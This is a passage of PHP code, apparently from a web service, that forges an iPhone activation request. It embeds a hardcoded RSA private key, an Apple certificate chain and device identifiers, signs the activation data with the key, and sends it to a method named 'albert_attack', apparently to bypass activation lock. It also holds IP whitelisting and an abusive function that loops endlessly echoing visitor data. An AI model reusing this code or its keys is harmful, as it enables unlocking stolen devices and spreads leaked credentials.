                yO2EABYoYBIlgEi0ZKAKBAggc2tzAgAAAKCBxDCBwQIBATAKBggqhkjOPQQD
                AgNHADBEAiAtvdWemPKvE6kfMpY9pUYuvJcXbznA/oVLeEXPbzXtTgIgCBJP
                dGxZs0OZLgdfNAwJuxa+1dqcFgV1LDen2Gi9eM8wWzAVBgcqhkjOPQIBoAoG
                CCqGSM49AwEHA0IABEkwIk/9i9S9ftCQYlEhj7posxvsEKddiVDNE/NFKlm7
                xBPZYwJOu+v84SkAY5d/P0p9OsjthAAWKGASJYBItGSgCgQIIHNrcwIAAAAw
                CgYIKoZIzj0EAwIDRwAwRAIgHU83XIiKQrKl0aoXCB+yJ5i05MQBRZ52f0zt
                yzsI34MCIF6QRIRaUsTcts4Q6f9Z/ME2fo8rEM34I6/KaMcD7+6q
            </data>
            <key>WifiAddress</key>
            <string>bc:4c:c4:14:58:ab</string>
        </dict>
    </dict>
</plist>';
$ActivationInfoXML64 = base64_encode($ActivationInfoXML);

$FairplayPrivateKeyBase64 =
"LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlDV3dJQkFBS0JnUUMzQktyTFBJQmFiaHByKzRTdnVRSG5iRjBzc3FSSVE2Ny8xYlRmQXJWdVVGNnA5c2RjdjcwTityOHlGeGVzRG1wVG1LaXRMUDA2c3pLTkFPMWs1SlZrOS9QMWVqejA4Qk1lOWVBYjRqdUFoVldkZkFJeWFKN3NHRmplU0wwMTVtQXZyeFRGY09NMTBGL3FTbEFSQmljY3hIalBYdHVXVnIwZkxHcmhNKy9BTVFJREFRQUJBb0dBQ0dXM2JISFBOZGI5Y1Z6dC9wNFBmMDNTakoxNXVqTVkwWFk5d1VtL2gxczZyTE84Ky8xME1ETUVHTWxFZGNtSGlXUmt3T1ZpalJIeHpOUnhFQU1JODdBcnVvZmhqZGRiTlZMdDZwcFcybkxDSzdjRURRSkZhaFRXOUdRRnpwVlJRWFhmeHI0Y3MxWDNrdXRsQjZ1WTJWR2x0eFFGWXNqNWRqdjdEK0E3MkEwQ1FRRFpqMVJHZHhiZU9vNFh6eGZBNm40MkdwWmF2VGxNM1F6R0ZvQkpnQ3FxVnUxSlFPem9vQU1SVCtOUGZnb0U4K3VzSVZWQjRJbzBiQ1VUV0xwa0V5dFRBa0VBMTFyeklwR0loRmtQdE5jLzMzZnZCRmd3VWJzalRzMVY1RzZ6NWx5L1huRzlFTmZMYmxnRW9iTG1TbXozaXJ2QlJXQURpd1V4NXpZNkZOL0RtdGk1NndKQWRpU2Nha3VmY255dnp3UVo3UndwLzYxK2VyWUpHTkZ0YjJDbXQ4Tk82QU9laGNvcEhNWlFCQ1d5MWVjbS83dUovb1ozYXZmSmRXQkkzZkd2L2twZW13SkFHTVh5b0RCanB1M2oyNmJEUno2eHRTczc2N3IrVmN0VExTTDYrTzRFYWFYbDNQRW1DcngvVSthVGpVNDVyN0RuaThaK3dkaElKRlBkbkpjZEZrd0dId0pBUFErd1ZxUmpjNGgzSHd1OEk2bGxrOXdocEs5TzcwRkxvMUZNVmRheXRFbE15cXpRMi8wNWZNYjdGNnlhV2h1K1EyR0dYdmRsVVJpQTN0WTBDc2ZNMHc9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQ==";
$FairPlayCertChain64 =
'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';

openssl_sign(
$ActivationInfoXML,
$signature,
openssl_pkey_get_private(base64_decode($FairplayPrivateKeyBase64)),
'sha1WithRSAEncryption'
);
//sha1WithRSAEncryption
$ActivationInfoXMLSignature = base64_encode($signature);
$posti = '
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>ActivationInfoComplete</key>
        <true />
        <key>ActivationInfoXML</key>
        <data>' . $ActivationInfoXML64 . '</data>
        <key>FairPlayCertChain</key>
        <data>' . $FairPlayCertChain64 . '</data>
        <key>FairPlaySignature</key>
        <data>' . $ActivationInfoXMLSignature . '</data>
        <key>RKCertification</key>
        <data>
            MIIB9zCCAZwCAQEwADCB2gIBATAKBggqhkjOPQQDAgNIADBFAiEAk0kFrgp9oIqPSyw4
            CeWwPc1MAGYtjvghUvV+YvDGhicCIEE0vW+s4Zs61eFjJDzvVxAKbsHFNj7MtVrbr5zT
            i4k5MFswFQYHKoZIzj0CAaAKBggqhkjOPQMBBwNCAARuSdhS4I5eL1IyV2c+G690w4DH
            9DFQye4b8PMbQ7FKFnhGcUOXk0eTfeF4q+b+au3l22dbj1DdioLbCCbNFVyFoAoECCBz
            a3NIAAAAohYEFIT4wv/S+twSVWiuIUZOBiBDJj+OMIG3AgEBMAoGCCqGSM49BAMCA0kA
            MEYCIQDngLzCQYigVMuMh3dtsq8GxrcShp6QobrHkWEmtDwjWgIhAKeWSAcq9n+wgAav
            LU5TYBDy2smBJPSJxlgnECyB29RsMFswFQYHKoZIzj0CAaAKBggqhkjOPQMBBwNCAASU
            2VJGBNC+Hjw5KKv3qW9IFVBE5KdWnoMwJxku1j5+7lqSe2kYxYhT1rvPAt/r1/0wALzL
            aY59NYA0Ax8rKWfWMAoGCCqGSM49BAMCA0kAMEYCIQDhoMxEfjuVQgqo9ol5O6Li1Omg
            JMzaL4VCTNZVXfFv/AIhALdI44Q5KEuk0FwaycYSScndcuh5B88+NuFQn41isuwM
        </data>
        <key>RKSignature</key>
        <data>
            MEQCIBfETROMXro82io/uy53ChhYmoqvTsSSdL9K9YUxW+GLAiAhh9EZ4TRxuSqWoRqm
            0cop5KHlreeLv+PwHKpXn9Vmfw==
        </data>
        <key>serverKP</key>
        <data>
            TlVMTA==
        </data>
        <key>signActRequest</key>
        <data>
            TlVMTA==
        </data>
    </dict>
</plist>';
return $this->albert_attack($posti);
}

//here check that ip are registered inside of text file
public function auth($searchfor)
{

try {
$ip = DB::table('equipos')->where('ip', $searchfor)->get(); #detalles del envio

//dd($ip[0]->user_id);

if (isset($ip[0]->ip)) {
return true;
} else {
return false;
}
} catch (\Exception $e) {
return "ACCESO DENEGADO";
}
}
public function remove_fuckers()
{

$equipo = \App\Equipo::find(22);

/*$ip = DB::table('equipos')->where('ip', $searchfor)->get(); #detalles del envio

if (isset($ip[0]->id)) {
return true;
} else {
return false;
}
*/
}

public function blacklists($id)
{
try {
$browser = $_SERVER['HTTP_USER_AGENT'] . "\n\n";
$ip = $this->getUserIP();
//echo "<script languaje='javascript' type='text/javascript'>
    window.close();
</script>";
//parent.window.close();

while (true) {
echo $ip . "<br>" . $id . "<br>" . $browser;
}
} catch (ErrorException $e) {
while (true) {
echo $ip . "<br>" . $id . "<br>" . $browser;
}
}
}

public function url_actual()
{
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
$url = "https://";
} else {
$url = "http://";
}
return $url . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
}
}
